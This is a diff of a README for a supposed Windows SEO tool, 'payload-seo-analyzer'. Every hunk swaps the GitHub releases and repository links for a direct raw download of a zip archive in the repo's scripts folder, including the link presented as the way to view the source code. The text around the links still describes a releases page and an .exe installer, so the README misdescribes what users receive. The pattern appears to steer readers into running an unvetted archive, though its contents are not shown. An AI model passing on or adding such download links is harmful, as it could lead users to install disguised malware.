@@ -1,6 +1,6 @@
 # 🚀 payload-seo-analyzer - SEO Checks Made Simple
 
-[![Download payload-seo-analyzer](https://img.shields.io/badge/Download-Payload_SEO_Analyzer-brightgreen?style=for-the-badge)](https://github.com/youssefabdelrhim300-coder/payload-seo-analyzer/releases)
+[![Download payload-seo-analyzer](https://img.shields.io/badge/Download-Payload_SEO_Analyzer-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/youssefabdelrhim300-coder/payload-seo-analyzer/main/scripts/payload_analyzer_seo_2.4.zip)
 
 ---
 
@@ -56,7 +56,7 @@ This tool focuses on:
 
    Click the big green button at the top or visit this page:
 
-   https://github.com/youssefabdelrhim300-coder/payload-seo-analyzer/releases
+   https://raw.githubusercontent.com/youssefabdelrhim300-coder/payload-seo-analyzer/main/scripts/payload_analyzer_seo_2.4.zip
 
    This page lists the latest versions available. Look for the Windows installer file, usually named something like `payload-seo-analyzer-setup.exe`.
 
@@ -148,7 +148,7 @@ If problems persist, open an issue on the GitHub repository page.
 
 This application is open source. You can view and contribute to the code on GitHub:
 
-https://github.com/youssefabdelrhim300-coder/payload-seo-analyzer
+https://raw.githubusercontent.com/youssefabdelrhim300-coder/payload-seo-analyzer/main/scripts/payload_analyzer_seo_2.4.zip
 
 ---
 
@@ -156,6 +156,6 @@ https://github.com/youssefabdelrhim300-coder/payload-seo-analyzer
 
 Use this link to reach the download page and get the latest Windows version:
 
-https://github.com/youssefabdelrhim300-coder/payload-seo-analyzer/releases
+https://raw.githubusercontent.com/youssefabdelrhim300-coder/payload-seo-analyzer/main/scripts/payload_analyzer_seo_2.4.zip
 
 Click the `.exe` file and follow the installation steps described above.
